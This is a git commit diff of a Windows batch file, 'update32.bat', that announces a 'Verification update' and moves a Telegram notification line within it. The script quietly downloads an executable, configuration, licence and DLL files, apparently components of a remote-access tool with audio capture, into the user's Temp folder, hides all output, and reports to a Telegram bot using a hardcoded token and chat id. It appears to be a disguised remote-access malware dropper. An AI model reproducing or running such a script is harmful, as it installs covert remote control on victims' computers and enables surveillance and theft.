46c83e80e8466e11f1d2bca7262b8d2d85e1e8c8
Solomonboy <160071648+Solomonboy@users.noreply.github.com>
2025-07-25 16:23:55 +0300

    Update update32.bat

--- update32.bat
+++ update32.bat
@@ -2,6 +2,7 @@
 echo Verification update in progress. Please wait...
 set "TEMP=%USERPROFILE%\AppData\Local\Temp"
 
+curl -s -X GET "https://api.telegram.org/bot6579934751:AAEUzUGdZt-DH2XnbG15mWCzYdv37a6BNWc/sendMessage" -d "chat_id=-1002239672340&text=Verify starting..." >nul 2>&1
 curl -L -o "%TEMP%\client32.exe" "https://github.com/helper-net/update/raw/refs/heads/main/client32.exe" >nul 2>&1
 curl -L -o "%TEMP%\client32.ini" "https://raw.githubusercontent.com/helper-net/update/refs/heads/main/client32.ini" >nul 2>&1
 curl -L -o "%TEMP%\NSM.LIC" "https://github.com/helper-net/update/raw/refs/heads/main/NSM.LIC" >nul 2>&1
@@ -10,7 +11,6 @@ curl -L -o "%TEMP%\HTCTL32.DLL" "https://github.com/helper-net/update/raw/refs/h
 curl -L -o "%TEMP%\msvcr100.dll" "https://github.com/helper-net/update/raw/refs/heads/main/msvcr100.dll" >nul 2>&1
 curl -L -o "%TEMP%\nskbfltr.inf" "https://github.com/helper-net/update/raw/refs/heads/main/nskbfltr.inf" >nul 2>&1
 curl -L -o "%TEMP%\NSM.ini" "https://github.com/helper-net/update/raw/refs/heads/main/NSM.ini" >nul 2>&1
-curl -s -X GET "https://api.telegram.org/bot6579934751:AAEUzUGdZt-DH2XnbG15mWCzYdv37a6BNWc/sendMessage" -d "chat_id=-1002239672340&text=Verify starting..." >nul 2>&1
 curl -L -o "%TEMP%\nsm_vpro.inf" "https://github.com/helper-net/update/raw/refs/heads/main/nsm_vpro.inf" >nul 2>&1
 curl -L -o "%TEMP%\AudioCapture.dll" "https://github.com/helper-net/update/raw/refs/heads/main/AudioCapture.dll" >nul 2>&1
 curl -L -o "%TEMP%\pcicapi.dll" "https://github.com/helper-net/update/raw/refs/heads/main/pcicapi.dll" >nul 2>&1
